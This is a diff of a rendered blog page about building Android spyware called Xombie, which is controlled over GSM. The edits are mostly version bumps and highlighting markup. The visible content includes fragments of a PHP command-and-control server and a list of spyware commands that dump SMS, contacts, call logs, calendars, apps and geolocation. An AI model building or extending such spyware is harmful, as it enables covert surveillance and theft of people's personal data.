@@ -5,9 +5,9 @@
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?"> -->
    <link rel="icon" type="image/png" href="/favicon.png"/>
-   <!-- Begin Jekyll SEO tag v2.7.1 -->
+   <!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>Building Android Spyware | Arti Karahoda</title>
-<meta name="generator" content="Jekyll v3.9.1" />
+<meta name="generator" content="Jekyll v3.9.5" />
 <meta property="og:title" content="Building Android Spyware" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="Xombie APK is an Android spyware which works with the latest SDK version (API level 29). This research post will outline numerous functionalities that can be used for such purposes – for educational use only. The application is part of a larger project—SMS Xombie—which makes use of the GSM network to command and control infected devices." />
@@ -16,11 +16,12 @@
 <meta property="og:url" content="https://artikrh.github.io/posts/building-android-spyware.html" />
 <meta property="og:site_name" content="Arti Karahoda" />
 <meta property="og:image" content="https://artikrh.github.io/assets/images/xombie.jpg" />
+<meta property="og:type" content="website" />
 <meta name="twitter:card" content="summary_large_image" />
 <meta property="twitter:image" content="https://artikrh.github.io/assets/images/xombie.jpg" />
 <meta property="twitter:title" content="Building Android Spyware" />
 <script type="application/ld+json">
-{"@type":"WebPage","image":"https://artikrh.github.io/assets/images/xombie.jpg","url":"https://artikrh.github.io/posts/building-android-spyware.html","headline":"Building Android Spyware","description":"Xombie APK is an Android spyware which works with the latest SDK version (API level 29). This research post will outline numerous functionalities that can be used for such purposes – for educational use only. The application is part of a larger project—SMS Xombie—which makes use of the GSM network to command and control infected devices.","@context":"https://schema.org"}</script>
+{"@context":"https://schema.org","@type":"WebPage","description":"Xombie APK is an Android spyware which works with the latest SDK version (API level 29). This research post will outline numerous functionalities that can be used for such purposes – for educational use only. The application is part of a larger project—SMS Xombie—which makes use of the GSM network to command and control infected devices.","headline":"Building Android Spyware","image":"https://artikrh.github.io/assets/images/xombie.jpg","url":"https://artikrh.github.io/posts/building-android-spyware.html"}</script>
 <!-- End Jekyll SEO tag -->
 
    <meta property="og:image:width" content="1200" />
@@ -682,7 +683,7 @@ img {
 
 <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"GET"</span><span class="p">)</span> <span class="p">{</span>
-	<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">]))</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">]))</span> <span class="p">{</span>
 		<span class="nv">$id</span> <span class="o">=</span> <span class="nf">sanitize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"uuid"</span><span class="p">]);</span>
 		<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[0-9a-f]</span><span class="si">{</span><span class="nv">8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12</span><span class="si">}</span><span class="s2">/i"</span><span class="p">,</span> <span class="nv">$id</span><span class="p">))</span> <span class="p">{</span>
 			<span class="c1">// Available: kill, smsDump, contactsDump, callsDump, getGeoLocation, appsDump, deviceInfo, calendarsDump</span>
@@ -707,7 +708,7 @@ img {
 	<span class="nv">$task</span> <span class="o">=</span> <span class="nf">sanitize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'task'</span><span class="p">]);</span>
 	<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">];</span>
 
-	<span class="k">if</span> <span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="o">||</span> <span class="nb">empty</span><span class="p">(</span><span class="nv">$task</span><span class="p">)</span> <span class="o">||</span> <span class="nb">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$task</span><span class="p">)</span> <span class="o">||</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
 		<span class="k">die</span><span class="p">(</span><span class="s2">"Parameters cannot be empty"</span><span class="p">);</span>
 	<span class="p">}</span>
 
